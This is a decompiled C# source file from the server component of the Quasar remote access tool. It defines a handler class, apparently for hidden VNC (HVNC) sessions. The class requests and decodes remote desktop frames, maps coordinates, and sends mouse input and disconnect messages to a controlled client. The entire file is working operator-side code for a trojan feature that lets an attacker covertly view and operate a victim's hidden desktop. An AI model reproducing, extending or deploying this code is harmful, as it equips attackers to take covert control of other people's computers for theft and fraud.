using System;
using System.Drawing;
using System.IO;
using Quasar.Common.Messages;
using Quasar.Common.Messages.Monitoring.RemoteDesktop;
using Quasar.Common.Messages.other;
using Quasar.Common.Networking;
using Quasar.Common.Video.Codecs;
using Quasar.Server.Networking;

namespace Quasar.Server.Messages
{
    // Token: 0x0200001D RID: 29
    public class FrmHvnHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        // Token: 0x170000BB RID: 187
        // (get) Token: 0x060001FC RID: 508 RVA: 0x00007542 File Offset: 0x00005742
        // (set) Token: 0x060001FD RID: 509 RVA: 0x0000754A File Offset: 0x0000574A
        public bool IsStarted { get; set; }

        // Token: 0x170000BC RID: 188
        // (get) Token: 0x060001FE RID: 510 RVA: 0x00007554 File Offset: 0x00005754
        // (set) Token: 0x060001FF RID: 511 RVA: 0x00007598 File Offset: 0x00005798
        public Size LocalResolution
        {
            get
            {
                object sizeLock = this._sizeLock;
                Size localResolution;
                lock (sizeLock)
                {
                    localResolution = this._localResolution;
                }
                return localResolution;
            }
            set
            {
                object sizeLock = this._sizeLock;
                lock (sizeLock)
                {
                    this._localResolution = value;
                }
            }
        }

        // Token: 0x14000016 RID: 22
        // (add) Token: 0x06000200 RID: 512 RVA: 0x000075DC File Offset: 0x000057DC
        // (remove) Token: 0x06000201 RID: 513 RVA: 0x00007614 File Offset: 0x00005814
        public event FrmHvnHandler.DisplaysChangedEventHandler DisplaysChanged;

        // Token: 0x06000202 RID: 514 RVA: 0x00007649 File Offset: 0x00005849
        private void OnDisplaysChanged(int value)
        {
            this.SynchronizationContext.Post(delegate (object val)
            {
                FrmHvnHandler.DisplaysChangedEventHandler displaysChanged = this.DisplaysChanged;
                if (displaysChanged == null)
                {
                    return;
                }
                displaysChanged(this, (int)val);
            }, value);
        }

        // Token: 0x06000203 RID: 515 RVA: 0x00007668 File Offset: 0x00005868
        public FrmHvnHandler(Client client) : base(true)
        {
            this._client = client;
        }

        // Token: 0x06000204 RID: 516 RVA: 0x0000768E File Offset: 0x0000588E
        public override bool CanExecute(IMessage message)
        {
            return message is GetDesktopResponse || message is GetMonitorsResponse;
        }

        // Token: 0x06000205 RID: 517 RVA: 0x000076A3 File Offset: 0x000058A3
        public override bool CanExecuteFrom(ISender sender)
        {
            return this._client.Equals(sender);
        }

        // Token: 0x06000206 RID: 518 RVA: 0x000076B4 File Offset: 0x000058B4
        public override void Execute(ISender sender, IMessage message)
        {
            GetDesktopResponse getDesktopResponse = message as GetDesktopResponse;
            if (getDesktopResponse != null)
            {
                this.Execute(sender, getDesktopResponse);
                return;
            }
            GetMonitorsResponse getMonitorsResponse = message as GetMonitorsResponse;
            if (getMonitorsResponse == null)
            {
                return;
            }
            this.Execute(sender, getMonitorsResponse);
        }

        // Token: 0x06000207 RID: 519 RVA: 0x000076E8 File Offset: 0x000058E8
        public void BeginReceiveFrames(int quality)
        {
            object syncLock = this._syncLock;
            lock (syncLock)
            {
                this.IsStarted = true;
                UnsafeStreamCodec codec = this._codec;
                if (codec != null)
                {
                    codec.Dispose();
                }
                this._codec = null;
                this._client.Send<GetDesktop>(new GetDesktop
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = 0
                });
            }
        }

        // Token: 0x06000208 RID: 520 RVA: 0x00007768 File Offset: 0x00005968
        public void EndReceiveFrames()
        {
            object syncLock = this._syncLock;
            lock (syncLock)
            {
                this.IsStarted = false;
            }
        }

        // Token: 0x06000209 RID: 521 RVA: 0x000077AC File Offset: 0x000059AC
        public void RefreshDisplays()
        {
            this._client.Send<GetMonitors>(new GetMonitors());
        }

        // Token: 0x0600020A RID: 522 RVA: 0x000077BE File Offset: 0x000059BE
        public void SendMouseEvent(int msg, int IwParam, int IlParam)
        {
            this._client.Send<HvncInput>(new HvncInput
            {
                msg = (uint)msg,
                lParam = IlParam,
                wParam = IwParam
            });
        }

        // Token: 0x0600020B RID: 523 RVA: 0x000077E8 File Offset: 0x000059E8
        public int[] GetCordinates(int x, int y)
        {
            int num = x * this._codec.Resolution.Width / this.LocalResolution.Width;
            int num2 = y * this._codec.Resolution.Height / this.LocalResolution.Height;
            return new int[]
            {
                num,
                num2
            };
        }

        // Token: 0x0600020C RID: 524 RVA: 0x00007848 File Offset: 0x00005A48
        private void Execute(ISender client, GetDesktopResponse message)
        {
            object syncLock = this._syncLock;
            lock (syncLock)
            {
                if (this.IsStarted)
                {
                    if (this._codec == null || this._codec.ImageQuality != message.Quality || this._codec.Monitor != message.Monitor || this._codec.Resolution != message.Resolution)
                    {
                        UnsafeStreamCodec codec = this._codec;
                        if (codec != null)
                        {
                            codec.Dispose();
                        }
                        this._codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
                    }
                    using (MemoryStream memoryStream = new MemoryStream(message.Image))
                    {
                        this.OnReport(new Bitmap(this._codec.DecodeData(memoryStream), this.LocalResolution));
                    }
                    message.Image = null;
                    client.Send<GetDesktop>(new GetDesktop
                    {
                        Quality = message.Quality,
                        DisplayIndex = message.Monitor
                    });
                }
            }
        }

        // Token: 0x0600020D RID: 525 RVA: 0x00007970 File Offset: 0x00005B70
        private void Execute(ISender client, GetMonitorsResponse message)
        {
            this.OnDisplaysChanged(message.Number);
        }

        // Token: 0x0600020E RID: 526 RVA: 0x0000797E File Offset: 0x00005B7E
        public void Dispose()
        {
            this._client.Send<PlugDisconnect>(new PlugDisconnect());
            this.Dispose(true);
            GC.SuppressFinalize(this);
        }

        // Token: 0x0600020F RID: 527 RVA: 0x000079A0 File Offset: 0x00005BA0
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                object syncLock = this._syncLock;
                lock (syncLock)
                {
                    UnsafeStreamCodec codec = this._codec;
                    if (codec != null)
                    {
                        codec.Dispose();
                    }
                    this.IsStarted = false;
                }
            }
        }

        // Token: 0x040000C6 RID: 198
        private readonly object _syncLock = new object();

        // Token: 0x040000C7 RID: 199
        private readonly object _sizeLock = new object();

        // Token: 0x040000C8 RID: 200
        private Size _localResolution;

        // Token: 0x040000CA RID: 202
        private readonly Client _client;

        // Token: 0x040000CB RID: 203
        private UnsafeStreamCodec _codec;

        // Token: 0x02000085 RID: 133
        // (Invoke) Token: 0x0600061B RID: 1563
        public delegate void DisplaysChangedEventHandler(object sender, int value);
    }
}
